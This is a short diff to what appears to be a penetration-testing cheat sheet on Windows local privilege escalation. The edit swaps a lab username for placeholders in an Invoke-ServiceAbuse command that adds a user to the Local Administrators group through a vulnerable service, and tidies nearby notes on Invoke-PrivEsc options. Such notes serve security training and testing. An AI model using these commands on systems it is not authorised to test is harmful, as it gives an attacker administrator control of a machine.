@@ -34,9 +34,9 @@ C:> Get-ModifiableService
 ##### Abuse Found Vulnerable Services
 In the three cmdlets, a `AbuseFunction` field is returned with the command to run to gain privileges. To make the user member of Local Administrators, can use:
 ```powershell
-C:> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
+# Make <user> member of the Admins group. Just need to relog session and that's it.
+C:> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<user>'
 ```
-This will make user member of the Admins group. Just need to relog session and that's it.
 
 ### PrivEsc
 ---
@@ -46,7 +46,7 @@ C:> Invoke-PrivEsc
 - Groups   : Groups of our interest when checking ACLs.
 - Mode     : Mode to use - full or lhf (default).
 - Extended : Switch enables lookups that may last for several minutes.
-- 
+
 ##### Find Vulnerable Services
 - Run All Checks
 ```powershell
